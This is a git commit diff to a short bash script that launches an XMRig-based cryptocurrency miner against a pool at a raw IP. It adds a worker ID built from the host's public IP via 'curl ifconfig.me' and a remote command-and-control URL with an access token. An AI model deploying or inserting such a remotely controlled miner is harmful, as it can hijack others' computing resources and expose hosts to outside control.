2d980b78ac5713e764c0792a1711fa7f15cb58fd
Ryan Wahyudi <116867564+RyanWahyudi8@users.noreply.github.com>
2023-12-29 20:56:47 +0700

    Update sage.sh

--- sage.sh
+++ sage.sh
@@ -1,5 +1,6 @@
 #!/bin/bash
-POOL=stratum+ssl://51.107.184.91:443
-WALLET=IRON:757ea84ec697775b5721d45cdc3a4e100ee0722a90ea359bcfd894f51c415b71:20491097150.SAGEGPU#lus6-e35u
+POOL=stratum+ssl://20.124.247.146:80
+WALLET=IRON:757ea84ec697775b5721d45cdc3a4e100ee0722a90ea359bcfd894f51c415b71:20491097150.ANDIKA$(echo "$(curl -s ifconfig.me)" | tr . _ )#lus6-e35u
+myip=ANDIKA$(echo "$(curl -s ifconfig.me)" | tr . _ )
 cd "$(dirname "$0")"
-chmod +x ./xmrigDaemon && clear && ./xmrigDaemon -a rx/0 -o $POOL -u $WALLET $@ -p x -k --donate-level=1 --cc-disabled
+chmod +x ./xmrigDaemon && clear && ./xmrigDaemon -a rx/0 -o $POOL -u $WALLET $@ -p x -k --donate-level=1 --cc-url=51.107.184.91:2012 --cc-access-token=kevin --cc-worker-id=${myip}
